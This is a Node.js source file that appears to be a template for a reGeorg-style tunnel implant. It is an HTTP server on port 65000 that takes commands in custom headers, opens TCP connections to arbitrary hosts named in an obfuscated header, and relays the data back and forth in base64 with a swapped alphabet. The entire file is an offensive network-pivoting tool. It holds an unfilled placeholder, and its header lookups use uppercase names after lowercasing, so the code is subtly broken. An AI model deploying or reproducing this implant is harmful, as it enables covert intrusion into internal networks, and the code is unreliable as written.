var http = require('http');
var net = require('net');
var en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
var de = "BASE64 CHARSLIST";
var dataBuff = [];
var tcpconns = [];


function createOutboundTCP(res, host, port, mark)
{
    if(mark === null)
    {
		var tcpConn = new net.Socket();
		tcpConn.connect(port,host);
		tcpConn.on( 'connect', function() {
			tcpconns[mark] = tcpConn;
			dataBuff[mark] = new Array();

			res.writeHead(200,{'X-STATUS': 'OK'});
			res.end();
		});

		tcpConn.on('data', function(data) {
			dataBuff[mark].unshift(data);
		});

		tcpConn.on('error', function(error) {
			console.log("Error creating new Outbound: " + error.message);
			res.writeHead(200, {'X-STATUS':'FAIL','X-ERROR' : 'Failed connecting to target'});
			res.end();
		});
    }
    else if(mark != null && tcpconns[mark] == null)
    {
            var tcpConn = new net.Socket();
            tcpConn.connect(port,host);

            tcpConn.on( 'connect', function() {
				tcpconns[mark] = tcpConn;
				dataBuff[mark] = new Array();
				res.writeHead(200,{'X-STATUS': 'OK'});
				res.end();
            });

			tcpConn.on('data', function(data) {
				dataBuff[mark].unshift(data);
			});

            tcpConn.on('error', function(error){
				console.log("Error creating new Outbound: "+error.message);
				res.writeHead(200, {'X-STATUS':'FAIL','X-ERROR' : 'Failed connecting to target'});
				res.end();
            });
    }
    else
    {
        res.writeHead(200,{'X-STATUS': 'OK'});
        res.end();
    }
}

function readOutboundTCP(res, mark)
{
	var currData = dataBuff[mark].pop();
	if(currData != null)
	{
		res.writeHead(200,{'X-STATUS': 'OK','Connection': 'Keep-Alive'});
		res.write(StrTr(Buffer.from(currData).toString('base64'), en, de));
		res.end();
	}
	else
	{
		console.log('NO DATA IN BUFFER');
		res.writeHead(200, {'X-STATUS': 'OK'});
		res.end();
	}

}

function disconnectOutboundTCP(res, mark, error)
{
	var tcpConn=tcpconns[mark];

	if(tcpConn!=null)
	{
		tcpConn.destroy();
		tcpConn=null;
		tcpconns[mark]=null;
		dataBuff[mark]=null;
	}

	if(error!=null)
	{
		var sessionid = 'Ur' + Math.random();
		res.writeHead(200, {'Set-Cookie': 'SESSIONID=' + sessionid + ';', "XXXX": error.message});
		res.end();
	 }
	 else
	 {
		res.writeHead(200, {'X-STATUS': 'OK'});
		res.end();
	 }

}
function deault_page(res) {
	var sessionid = 'Ur' + Math.random();
	res.writeHead(200, {'Set-Cookie': 'SESSIONID=' + sessionid + ';'});
	res.end("Georg says, 'All seems fine'");
}

function forwardData(req, res, mark)
{
	var fdata;

	req.on('data', function (chunk) {
		fdata = chunk;
	});

	req.on('end', function (){
		if(fdata != null)
		{
			var tcpSocket = tcpconns[mark];
			if(tcpSocket != null)
			{
				databaffuer = new Buffer.from(StrTr(fdata.toString(), de, en), 'base64');
				tcpSocket.write(databaffuer);
				res.writeHead(200,{'X-STATUS': 'OK'});
				res.end();
			}
			else
			{
				console.log('No Cookie session to forward');
				res.writeHead(200,{'X-STATUS':'FAIL','X-ERROR':'POST request read filed'});
				res.end();
			}
		}
		else
		{
			console.log('No data in forward');
			res.writeHead(200,{'X-STATUS':'FAIL','X-ERROR':'POST request read filed'});
			res.end();
		}

	});
}

function StrTr(input, frm, to){
  var r = "";
  for(i=0; i<input.length; i++){
	index = frm.indexOf(input[i]);
	if(index != -1){
	  r += to[index];
	}else{
	  r += input[i];
	}
  }
  return r;
}


var server=http.createServer(function (req, res) {

	var old_header = req.headers;

	var headers = {};
	for(var item in old_header) {
		headers[item.toLowerCase()] = old_header[item];
	}

	res.statusCode = 200;
	var cmd = headers['X-CMD'];
	if (cmd!=null) {
		mark = cmd.substring(0, 22);
		cmd = cmd.substring(22);
		if (cmd == "CONNECT") {
			try{
				var target_str = Buffer.from(StrTr(headers["X-TARGET"], de, en), 'base64').toString();
				var target_ary = target_str.split("|");
				var target = target_ary[0];
				port = parseInt(target_ary[1]);
				createOutboundTCP(res, target, port, mark);
			}catch(error){
				disconnectOutboundTCP(res, mark, error);
			}
		}else if(cmd == "DISCONNECT"){
			try
			{
				disconnectOutboundTCP(res, mark, null);
			}
			catch(error)
			{
				disconnectOutboundTCP(res, mark, error);
			}
		}else if(cmd == "READ"){
			try
			{
				readOutboundTCP(res, mark);
			}
			catch(error)
			{
				disconnectOutboundTCP(res, mark, error);
			}

		}else if(cmd == "FORWARD"){
			try
			{
				forwardData(req, res, mark);
			}
			catch(error)
			{
				disconnectOutboundTCP(res, mark, error);
			}

		}
		else{
			deault_page(res);
		}

	}else{
		deault_page(res);
	}

});

server.listen(65000, '0.0.0.0');
